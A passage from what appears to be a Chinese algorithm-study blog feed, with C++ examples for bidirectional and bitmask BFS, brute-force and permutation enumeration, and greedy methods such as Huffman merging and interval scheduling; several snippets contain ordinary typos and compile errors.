class="built_in">size</span>())&#123;</span><br><span class="line">            x0 = q2.<span class="built_in">front</span>().first;</span><br><span class="line">            y0 = q2.<span class="built_in">front</span>().second;</span><br><span class="line">            q2.<span class="built_in">pop</span>();</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            x0 = q1.<span class="built_in">front</span>().first;</span><br><span class="line">            y0 = q1.<span class="built_in">front</span>().second;</span><br><span class="line">            q1.<span class="built_in">pop</span>();</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> nx = x0 + dx[i];</span><br><span class="line">            <span class="type">int</span> ny = y0 + dy[i];</span><br><span class="line">            <span class="keyword">if</span>(nx&gt;=<span class="number">1</span>&amp;&amp;nx&lt;=r&amp;&amp;ny&gt;=<span class="number">1</span>&amp;&amp;ny&lt;=c&amp;&amp;map[nx][ny]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!dis[nx][ny])&#123;</span><br><span class="line">                    dis[nx][ny]=dis[x0][y0]+<span class="number">1</span>;</span><br><span class="line">                    vst[nx][ny]=vst[x0][y0];</span><br><span class="line">                    <span class="keyword">if</span>(flag) q1.<span class="built_in">push</span>(<span class="built_in">P</span>(nx,ny));</span><br><span class="line">                    <span class="keyword">else</span> q2.<span class="built_in">push</span>(<span class="built_in">P</span>(nx,ny));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">// 如果相遇了</span></span><br><span class="line">                    <span class="keyword">if</span>(vst[nx][ny]+vst[x0][y0]==<span class="number">3</span>)</span><br><span class="line">                        ans = dis[nx][ny] + dis[x0][y0];</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;r&gt;&gt;c;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=r;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=c;j++)&#123;</span><br><span class="line">            cin&gt;&gt;m[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dbfs</span>();</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="二进制状压bfs"><a href="#二进制状压bfs" class="headerlink" title="二进制状压bfs"></a>二进制状压bfs</h3><p>二进制状压适用于<strong>带状态的搜索过程</strong>，来节约存储状态所带来的内存开销，使用以下常见的二进制操作来变更状态</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-10.png"></p>
<p>例题：</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-11.png"></p>
<p>这道题需要携带钥匙进行搜索，这个携带的钥匙就是搜索过程中的状态，钥匙有a~j一共 10 把钥匙，这里 10 把钥匙可以用一个由 <code>0</code> 和 <code>1</code> 组成的 <code>int</code> 数来表示，<code>0</code>表示没拿这把钥匙，<code>1</code> 表示拿了这把钥匙，然后如果捡到了钥匙，使用二进制操作 <code>x|(1&lt;&lt;(k-1))</code> 把他变成 <code>1</code> 即可。</p>
<p>这里注意还有时间限制，时间限制为 <code>t</code>，就代表我们的搜索层数不能超过 <code>t</code> 层。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n,m,t;</span><br><span class="line"><span class="type">char</span> mp[<span class="number">25</span>][<span class="number">25</span>];</span><br><span class="line"><span class="type">bool</span> vis[<span class="number">25</span>][<span class="number">25</span>][<span class="number">1</span>&lt;&lt;<span class="number">11</span>];</span><br><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> x,y,key,Time;</span><br><span class="line">    <span class="built_in">node</span>()&#123;&#125;;</span><br><span class="line">    <span class="built_in">node</span>(<span class="type">int</span> xx,<span class="type">int</span> yy,<span class="type">int</span> kk,<span class="type">int</span> tt)&#123;</span><br><span class="line">        x=xx;y=yy;key=kk;Time=tt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">queue&lt;node&gt; q;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> stx,<span class="type">int</span> sty)</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="built_in">node</span>(stx,sty,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">    node now;</span><br><span class="line">    <span class="type">int</span> x,y,key;</span><br><span class="line">    vis[stx][sty][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        now = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(now.Time&gt;=t)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(mp[now.x][now.y] == <span class="string">&#x27;^&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> now.Time;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            x = now.x+dir[i][<span class="number">0</span>];</span><br><span class="line">            y = now.y+dir[i][<span class="number">1</span>];</span><br><span class="line">            key = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(x&gt;=<span class="number">0</span>&amp;&amp;x&lt;=n<span class="number">-1</span>&amp;&amp;y&gt;=<span class="number">0</span>&amp;&amp;y&lt;=m<span class="number">-1</span>&amp;&amp;mp[x][y]!=<span class="string">&#x27;*&#x27;</span>&amp;&amp;!vis[x][y][now.key])&#123;</span><br><span class="line">                <span class="keyword">if</span>(mp[x][y]&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;mp[x][y]&lt;=<span class="string">&#x27;j&#x27;</span>)&#123;</span><br><span class="line">                    <span class="comment">// 这里用二进制操作将对应的元素变成 1</span></span><br><span class="line">                    key |= (<span class="number">1</span>&lt;&lt;(mp[x][y]-<span class="string">&#x27;a&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(mp[x][y]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp; mp[x][y]&lt;=<span class="string">&#x27;J&#x27;</span>)&#123;</span><br><span class="line">                    <span class="comment">// 这里用二进制操作定位对应的元素,判断他是否为1,如果不是 1 就 continue</span></span><br><span class="line">                    <span class="keyword">if</span>(!(now.key&amp;(<span class="number">1</span>&lt;&lt;(mp[x][y]-<span class="string">&#x27;A&#x27;</span>))))&#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                q.<span class="built_in">push</span>(<span class="built_in">node</span>(x,y,now.key|key,now.Time+<span class="number">1</span>));</span><br><span class="line">                vis[x][y][now.key]=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans,stx,sty;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m&gt;&gt;t)&#123;</span><br><span class="line">        <span class="comment">// 记得初始化</span></span><br><span class="line">        <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="built_in">sizeof</span>(vis));</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">                cin&gt;&gt;mp[i][j];</span><br><span class="line">                <span class="keyword">if</span>(mp[i][j]==<span class="string">&#x27;@&#x27;</span>)&#123;</span><br><span class="line">                    stx = i;</span><br><span class="line">                    sty = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = <span class="built_in">bfs</span>(stx,sty);</span><br><span class="line">        cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>搜索</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】暴力求解法</title>
    <url>/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/</url>
    <content><![CDATA[<h1 id="【算法】暴力求解法"><a href="#【算法】暴力求解法" class="headerlink" title="【算法】暴力求解法"></a>【算法】暴力求解法</h1><h2 id="简单枚举"><a href="#简单枚举" class="headerlink" title="简单枚举"></a>简单枚举</h2><p>简单枚举的基本思路就是, 枚举起点, 枚举终点, 然后里面再去做运算, 例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image.png"></p>
<p>对于这道题, 如果使用暴力枚举法的话, 就要枚举每一个元素作为起点, 再枚举每个元素前面的元素作为终点的情况, 代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> ncase=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n)&#123;</span><br><span class="line">        <span class="comment">// 注意会溢出</span></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> num[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cin&gt;&gt;num[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; i+j&lt;n; j++)&#123;</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> tmp = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;j; k++)&#123;</span><br><span class="line">                    tmp *= num[i+k];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(tmp&gt;ans)&#123;</span><br><span class="line">                    ans = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ans&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            ans = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;++ncase&lt;&lt;<span class="string">&quot;: The maximum product is&quot;</span>&lt;&lt;ans&lt;&lt;<span class="string">&quot;.&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里给一个值范围的表格:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image-1.png"></p>
<h2 id="排列法枚举"><a href="#排列法枚举" class="headerlink" title="排列法枚举"></a>排列法枚举</h2><p>排列法进行枚举可以使用 STL 中的 <code>next_permutation()</code> , 复杂度为 O(n), 用法如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">next_permutation</span>() <span class="comment">// 获取下一个排列组合</span></span><br><span class="line"><span class="built_in">prev_permutation</span>() <span class="comment">// 获取上一个排列组合</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// next_premutation(起点, 终点)</span></span><br><span class="line"><span class="comment">//如果有下一个排列组合就返回 true 并替换当前数组, 如果没有就返回 false</span></span><br><span class="line"><span class="type">int</span> num[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    cout&lt;&lt;num[<span class="number">0</span>]&lt;&lt;num[<span class="number">1</span>]&lt;&lt;num[<span class="number">2</span>]&lt;&lt;num[<span class="number">3</span>]&lt;&lt;endl</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="built_in">next_premutation</span>(num,num+<span class="number">4</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image-2.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,m;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)&#123;</span><br><span class="line">        <span class="type">int</span> num[<span class="number">1010</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            num[i]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> tmp=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp==m) <span class="keyword">break</span>;</span><br><span class="line">            tmp++;</span><br><span class="line">        &#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(num+<span class="number">1</span>,num+n+<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            cout&lt;&lt;num[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;num[n]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二进制法"><a href="#二进制法" class="headerlink" title="二进制法"></a>二进制法</h2><p>常用的位运算符有 左移(&lt;&lt;) 和 右移(&gt;&gt;), 位运算操作不建议对<strong>负数</strong>操作</p>
<p> 其中 <code>x&lt;&lt;k</code> 表示将 x 转换为二进制再左移 k 位补零, 十进制下的运算为 $x*2^k$.</p>
<p><code>x&gt;&gt;k</code> 在十进制下的运算为 $x&#x2F;2^k$.</p>
<p>位运算常用于状态压缩, 比如有 5 个物品, 我们可以用二进制数 <code>01000</code> 表示只有第 2 个物品被取了, 其他物品没有被取. 当需要枚举的子集或者超集的时候, 就可以使用状态压缩.</p>
<p>以下是常用的位运算技巧:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image-3.png"></p>
<p>例题:</p>
<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E6%9A%B4%E5%8A%9B%E6%B1%82%E8%A7%A3%E6%B3%95/image-4.png"></p>
<p>这道题可以使用二进制枚举来做</p>
<p>首先是如何用二进制去表示每一个排列组合, 对于 $n$ 个正整数, 从 $0$ 遍历到 $2^n-1$ 就可以表示所有的组合了, 二进制下就是 $00..00$ 遍历到 $11..11$, 然后使用<strong>位运算</strong>去获取所有的排列, 这里用的位运算是 <code>(i&amp;(1&lt;&lt;j))</code> 表示获取 <code>i</code> 的 第 <code>j</code> 位, 代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// sort 的时候用来对排列后的结果排序</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a, vector&lt;<span class="type">int</span>&gt; b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;a.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=b[i])&#123;</span><br><span class="line">            <span class="keyword">return</span> a[i]&lt;b[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,r;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">    <span class="comment">// 遍历所有组合</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(<span class="number">1</span>&lt;&lt;n); i++)&#123;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//遍历排列</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//恢复获选的排列</span></span><br><span class="line">        <span class="keyword">if</span>(cnt==r)&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt;tmp;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                    <span class="comment">// 注意区分值和索引</span></span><br><span class="line">                    tmp.<span class="built_in">push_back</span>(j+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 从小到大排列</span></span><br><span class="line">        <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>(),cmp);</span><br><span class="line">        <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt; a : res)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> b : a)&#123;</span><br><span class="line">                cout&lt;&lt;<span class="built_in">setw</span>(<span class="number">3</span>)&lt;&lt;b;</span><br><span class="line">            &#125;</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>暴力求解</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】贪心算法</title>
    <url>/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="【算法】贪心算法"><a href="#【算法】贪心算法" class="headerlink" title="【算法】贪心算法"></a>【算法】贪心算法</h1><p>贪心算法在解决问题上的策略就是每次选取<strong>局部最优</strong>, 无论将来有什么结果, 这个选择都不会改变, 贪心算法能够获得近似最优解, 所以在使用贪心算法时要尝试去证明可行或者亲自去跑一下样例.</p>
<h2 id="霍夫曼编码"><a href="#霍夫曼编码" class="headerlink" title="霍夫曼编码"></a>霍夫曼编码</h2><p>霍夫曼编码其实也是一种贪心策略, 霍夫曼编码在每次编码时都会对出现频数少的字符进行编码, 示意图:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image.png"></p>
<p>通过每次对最少频数的字符编码来构造一颗霍夫曼树, 在最后高频词的字符就会被分配到短的二进制码.</p>
<p>例题:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image-1.png"></p>
<p>题目就是霍夫曼编码的模板题, 优先挑选消耗体力少的果子合并, 避免重复对消耗体力多的果子合并.</p>
<p>这里要注意的是如何通过代码去构造霍夫曼编码, 用到的方法是 <code>STL</code> 中的 <code>priority_queue</code> , 构建一个<strong>小根堆</strong>, 每次合并完后 <code>pop</code> 掉合并的两个元素, 在 <code>push</code> 合并后的元素即可.</p>
<p>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; <span class="function">heap</span></span><br><span class="line"><span class="function">    <span class="title">for</span><span class="params">(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        heap.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(heap.<span class="built_in">size</span>()&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">int</span> x = heap.<span class="built_in">top</span>();</span><br><span class="line">        heap.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> y = heap.<span class="built_in">top</span>();</span><br><span class="line">        heap.<span class="built_in">pop</span>();</span><br><span class="line">        res += x+y;</span><br><span class="line">        heap.<span class="built_in">push</span>(x+y);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="区间调度问题"><a href="#区间调度问题" class="headerlink" title="区间调度问题"></a>区间调度问题</h2><p>区间调度问题大部分情况是使用动态规划去做, 但是贪心在证明正确性后也可以去解决区间调度问题, 例题:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image-2.png"></p>
<p>这道题就是要在有限时间内尽量完成多的事, 这里可以去构思谈心策略:</p>
<ul>
<li>最短时间优先: 不可行, 如果按照最短时间的话可能会产生空隙.</li>
<li>最早开始优先: 不可行, 如果一个节目最早开始但是持续很久, 也不会是最优策略</li>
<li>最早结束优先: 可行</li>
</ul>
<p>这里就采用<strong>最早结束优先</strong>策略, 在写代码的时候要构造一个 <code>pair</code> 去记录开始时间和结束时间, 以便解决区间覆盖问题.</p>
<p>代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">vector&lt;&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; TVs;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> start, end;</span><br><span class="line">        cin&gt;&gt;start&gt;&gt;end;</span><br><span class="line">        <span class="comment">// 这里将 end 写在前面可以不用重构 cmp</span></span><br><span class="line">        TVs.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(end,start));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(TVs.<span class="built_in">begin</span>(),TVs.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> res=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> tmp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(TVs[i].second &gt;= TVs[tmp].first)&#123;</span><br><span class="line">            tmp = i;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再来看一道例题:</p>
<p><img src="/2023/12/05/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/image-3.png"></p>
<p>这道题由于奶牛到了一定要挤奶, 所以区间是无法变动的, 一定要安排一个栅栏给他, 这道题中的贪心策略就是时间开始早的先安排, 如果有空的就给他安排上, 没空的就再开一个栅栏.</p>
<p>代码的关键点就是要写一个结构体去记录奶牛的产奶时间, 结束时间和奶牛对应的编号, 对于每个栅栏, 要开一个 <code>pair</code>, 记录当前栅栏奶牛产奶的结束时间和自己的编号.</p>
<p>代码:</p>
